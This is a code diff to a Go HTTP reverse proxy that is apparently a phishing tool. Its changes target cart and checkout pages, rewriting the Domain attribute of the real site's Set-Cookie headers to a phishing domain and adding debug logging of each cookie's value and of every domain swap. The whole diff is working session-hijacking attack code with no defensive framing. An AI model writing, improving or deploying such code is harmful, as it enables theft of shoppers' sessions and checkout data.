@@ -1419,7 +1419,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			mergedCookies := p.mergeSplitCookies(rawCookies)
 			reqPath := resp.Request.URL.Path
 			if strings.Contains(reqPath, "cart/add") || strings.Contains(reqPath, "checkout") || strings.Contains(reqPath, "checkouts") {
-				log.Debug("COOKIE_DEBUG [%s]: raw=%d, merged=%d, final=%v", reqPath, len(rawCookies), len(mergedCookies), mergedCookies)
+				log.Debug("COOKIE_DEBUG [%s]: raw=%d, merged=%d", reqPath, len(rawCookies), len(mergedCookies))
+				for i, c := range mergedCookies {
+					log.Debug("COOKIE_DEBUG [%s] merged[%d]: %s", reqPath, i, c)
+				}
 			}
 
 			for _, rawCookie := range mergedCookies {
@@ -1430,19 +1433,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// 解析 cookie（http.ParseCookie 返回切片）
 				parsedCookies, err := http.ParseCookie(rawCookie)
 				if err != nil {
-					log.Debug("ParseCookie failed: %v", err)
+					log.Debug("COOKIE_PARSE_FAILED: %v", err)
+					log.Debug("COOKIE_PARSE_FAILED raw: %s", rawCookie)
 					// 解析失败时，对原始 Set-Cookie 字符串做 domain 替换
 					modified := rawCookie
-					// 提取 Domain 属性值（不区分大小写）
-					domainMatch := regexp.MustCompile(`(?i)(;\s*Domain=)([^;]+)`)
+					// 提取 Domain 属性值（不区分大小写，支持 Domain= 和 domain=）
+					domainMatch := regexp.MustCompile(`(?i)(;\s*[Dd]omain=)([^;]+)`)
 					if matches := domainMatch.FindStringSubmatch(rawCookie); len(matches) == 3 {
 						origDomain := strings.TrimSpace(matches[2])
 						phishDomain, ok := p.replaceHostWithPhished(origDomain)
 						if ok && phishDomain != origDomain {
 							modified = strings.Replace(rawCookie, matches[1]+matches[2], matches[1]+phishDomain, 1)
+							log.Debug("COOKIE_DOMAIN_REPLACED: %s -> %s", origDomain, phishDomain)
 						}
 					}
-					log.Debug("Modified Set-Cookie: %s", modified)
+					log.Debug("COOKIE_FINAL: %s", modified)
 					resp.Header.Add("Set-Cookie", modified)
 					continue
 				}
@@ -1488,7 +1493,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 
 					// 尝试替换 cookie 的 Domain（如果为空则保持为空）
+					oldDomain := ck.Domain
 					ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
+					if strings.Contains(reqPath, "cart/add") || strings.Contains(reqPath, "checkout") || strings.Contains(reqPath, "checkouts") {
+						log.Debug("COOKIE_DOMAIN_REPLACE: old=%s, new=%s", oldDomain, ck.Domain)
+					}
 					cookieStr := ck.String()
 					// 如果原始 cookie 包含 Partitioned 属性，追加到重新生成的 cookie 字符串
 					if hasPartitioned {
